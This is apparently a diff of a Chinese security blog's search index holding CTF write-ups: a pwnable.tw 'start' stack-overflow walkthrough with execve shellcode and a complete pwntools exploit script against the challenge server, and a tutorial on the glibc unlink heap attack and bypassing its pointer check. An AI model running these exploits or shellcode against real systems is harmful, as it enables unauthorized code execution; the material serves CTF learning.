+<p>1． 执行用户程序(如:fork)<br>2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。<br>3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）<br>4． 进行中断处理，根据系统调用表调用内核函数。<br>5． 执行内核函数。<br>6． 执行RESTORE_ALL并返回用户模式<br>Linux 32位的系统调用时通过int 80h来实现的，<strong>eax寄存器中为调用的功能号</strong>，ebx、ecx、edx、esi等等寄存器则依次为参数。</p>
+</blockquote>
+<p><a href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用功能号</a></p>
+<p>这里使用的两个系统调用信息如下：</p>
+<h4 id="第一个系统调用："><a href="#第一个系统调用：" class="headerlink" title="第一个系统调用："></a><strong>第一个系统调用：</strong></h4><p>将esp开始的14h字节数据写入标准输出（文件描述符1），即输出”Let’s start the CTF:”</p>
+<table>
+<thead>
+<tr>
+<th align="left">name</th>
+<th align="left">eax</th>
+<th align="left">ebx</th>
+<th align="left">ecx</th>
+<th align="left">edx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td>
+<td align="left">0x04</td>
+<td align="left">unsigned int fd = 1</td>
+<td align="left">const char __user *buf = esp</td>
+<td align="left">size_t count =14h</td>
+</tr>
+</tbody></table>
+<h4 id="第二个系统调用"><a href="#第二个系统调用" class="headerlink" title="第二个系统调用"></a>第二个系统调用</h4><p>从标准输入读取3ch字节到栈空间。</p>
+<table>
+<thead>
+<tr>
+<th align="left">name</th>
+<th align="left">eax</th>
+<th align="left">ebx</th>
+<th align="left">ecx</th>
+<th align="left">edx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td>
+<td align="left">0x03</td>
+<td align="left">unsigned int fd = 1</td>
+<td align="left">char __user *buf = esp</td>
+<td align="left">size_t count = 3ch</td>
+</tr>
+</tbody></table>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><h4 id="1-程序执行到0804808F"><a href="#1-程序执行到0804808F" class="headerlink" title="1 .程序执行到0804808F"></a>1 .程序执行到0804808F</h4><p>sys_write，输出14h字节数据：Let’s start the CTF:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	+-----------------+      &lt;----</span><br><span class="line">    |       Let’      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       s st      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       art       |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       the       |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       CTF:      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |   offset _exit  |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-程序执行到08048097"><a href="#2-程序执行到08048097" class="headerlink" title="2.程序执行到08048097"></a>2.程序执行到08048097</h4><p>sys_read，read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    +-----------------+      &lt;----</span><br><span class="line">    |       aaaa      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |       aaaa      |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-泄露ESP"><a href="#3-泄露ESP" class="headerlink" title="3.泄露ESP"></a>3.泄露ESP</h4><p>现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。</p>
+<h4 id="4-覆盖RET"><a href="#4-覆盖RET" class="headerlink" title="4. 覆盖RET"></a>4. 覆盖RET</h4><p>此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。</p>
+<h4 id="5-shellcode-原理"><a href="#5-shellcode-原理" class="headerlink" title="5. shellcode(原理)"></a>5. shellcode(原理)</h4><p>shellcode同样可以用系统调用的方式执行execve(“/bin/sh”,NULL,NULL)</p>
+<table>
+<thead>
+<tr>
+<th align="left">name</th>
+<th align="left">eax</th>
+<th align="left">ebx</th>
+<th align="left">ecx</th>
+<th align="left">edx</th>
+<th align="left">esi</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td>
+<td align="left">0x0b</td>
+<td align="left">char __user *</td>
+<td align="left">char <strong>user *</strong>user *</td>
+<td align="left">char <strong>user *</strong>user *</td>
+<td align="left"><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs</a></td>
+</tr>
+</tbody></table>
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">xor</span> eax,eax</span><br><span class="line">push eax</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line"><span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="keyword">xor</span> edx,edx</span><br><span class="line">mov al, <span class="number">0xb</span></span><br><span class="line">int 0x80&#x27;&#x27;&#x27; %(u32(&#x27;/sh\0&#x27;),u32(&#x27;/bin&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统。</p>
+<p>如：<code>context(arch = ‘amd64’ , os = ‘linux’, log_level=”debug”)</code></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">rem = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#等待write执行完毕</span></span><br><span class="line">rem.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送溢出数据，覆盖ret为0x08048087-&gt;输出14h字节</span></span><br><span class="line">line = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">rem.send(line)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收输出数据，其中就有Saved ESP</span></span><br><span class="line">stack_addr = rem.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接使用网上的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"><span class="comment">#参考覆盖RET分析</span></span><br><span class="line">shellcode_addr = p32(int.from_bytes(stack_addr, <span class="string">&#x27;little&#x27;</span>) + <span class="number">20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x14</span> + shellcode_addr + shellcode</span><br><span class="line">rem.sendline(payload)</span><br><span class="line"></span><br><span class="line">rem.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/3.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.xyz</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unlink漏洞攻击</title>
+    <url>/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
+ <a id="more"></a>
+
+<h2 id="从一段代码开始"><a href="#从一段代码开始" class="headerlink" title="从一段代码开始"></a>从一段代码开始</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" class></strong></p>
+<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
+<h2 id="什么是unlink"><a href="#什么是unlink" class="headerlink" title="什么是unlink"></a>什么是unlink</h2><p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
+<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
+<h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
+<p>malloc.c 中向后合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>
+
+<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
+<h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
+<p>malloc.c 中向前合并的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>
+
+<p>本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></span><br><span class="line">  FD = P-&gt;fd;             \</span><br><span class="line">  BK = P-&gt;bk;             \</span><br><span class="line">  FD-&gt;bk = BK;            \</span><br><span class="line">  BK-&gt;fd = FD;            \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>unlink 即为将 P 从链表中删除的过程。</p>
+<h2 id="unlink攻击"><a href="#unlink攻击" class="headerlink" title="unlink攻击"></a>unlink攻击</h2><p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
+<h3 id="原始的-unlink-攻击"><a href="#原始的-unlink-攻击" class="headerlink" title="原始的 unlink 攻击"></a>原始的 unlink 攻击</h3><p>述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prev_size = 偶数</span><br><span class="line">size = <span class="number">-4</span></span><br><span class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></span><br><span class="line">bk = shellcode address</span><br></pre></td></tr></table></figure>
+
+<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
+<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span></span><br><span class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address</span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *((<span class="built_in">free</span>@got–<span class="number">12</span>)-&gt;bk) = shellcode address</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = <span class="built_in">free</span>@got – <span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
+<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
+<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/2.png" class></strong></p>
+<h2 id="对抗技术"><a href="#对抗技术" class="headerlink" title="对抗技术"></a>对抗技术</h2><h3 id="Double-Free检测"><a href="#Double-Free检测" class="headerlink" title="Double Free检测"></a>Double Free检测</h3><p>该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="next-size非法检测"><a href="#next-size非法检测" class="headerlink" title="next size非法检测"></a>next size非法检测</h3><p>该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))&#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="双链表冲突检测"><a href="#双链表冲突检测" class="headerlink" title="双链表冲突检测"></a>双链表冲突检测</h3><p>该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br></pre></td></tr></table></figure>
+
+<p>但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。</p>
+<h2 id="绕过安全校验"><a href="#绕过安全校验" class="headerlink" title="绕过安全校验"></a>绕过安全校验</h2><p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								          \</span><br><span class="line">        FD-&gt;bk = BK;						    \</span><br><span class="line">        BK-&gt;fd = FD;						    \</span><br><span class="line">        ...</span><br><span class="line">    &#125;									              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>为了绕过以上指针校验，需要以下条件：</p>
+<blockquote>
+<p>a） 程序中存在一个全局指针变量 ptr<br>         b） ptr 指向的堆内存可由用户控制</p>
+</blockquote>
+<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0xC</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
+
+<p>在执行 unlink（P）时的指针操作如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *ptr = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *ptr = ptr - <span class="number">0xC</span>。</span><br></pre></td></tr></table></figure>
+
+<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
+<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Heap</category>
+        <category>Heap_Attack</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
   </entry>
   <entry>
     <title>Heap I</title>
@@ -228,170 +555,6 @@
       </categories>
       <tags>
         <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>unlink漏洞攻击</title>
-    <url>/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
- <a id="more"></a>
-
-<h2 id="从一段代码开始"><a href="#从一段代码开始" class="headerlink" title="从一段代码开始"></a>从一段代码开始</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" class></strong></p>
-<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
-<h2 id="什么是unlink"><a href="#什么是unlink" class="headerlink" title="什么是unlink"></a>什么是unlink</h2><p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
-<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
-<h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
-<p>malloc.c 中向后合并的代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>
-
-<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
